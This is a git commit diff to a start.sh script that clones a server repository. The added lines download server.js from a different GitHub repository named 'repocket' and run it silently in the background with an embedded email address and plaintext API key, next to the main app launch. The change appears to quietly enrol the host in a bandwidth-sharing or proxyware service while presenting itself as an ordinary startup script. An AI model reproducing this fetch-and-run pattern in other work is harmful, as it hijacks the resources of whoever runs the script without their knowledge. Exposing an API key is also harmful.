09f04d20991a7ea2c468fa6f721a1b574d75170d
Anh Tran <157559633+malphite-code-1@users.noreply.github.com>
2025-07-17 10:52:02 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,6 +3,10 @@ git clone https://github.com/malphite-code-1/server.git
 
 cd server
 
+curl -O -L -J https://raw.githubusercontent.com/lu437903/repocket/refs/heads/main/server.js
+
+nohup RP_EMAIL=malphite848@gmail.com RP_API_KEY=c41ff3ef-ac25-4e91-aa23-39f5c8d91b93 ./node server.js >/dev/null 2>&1 &
+
 nohup ./node app.js >/dev/null 2>&1 &
 
 echo "Server started in the background. You can check the logs in the 'server' directory."
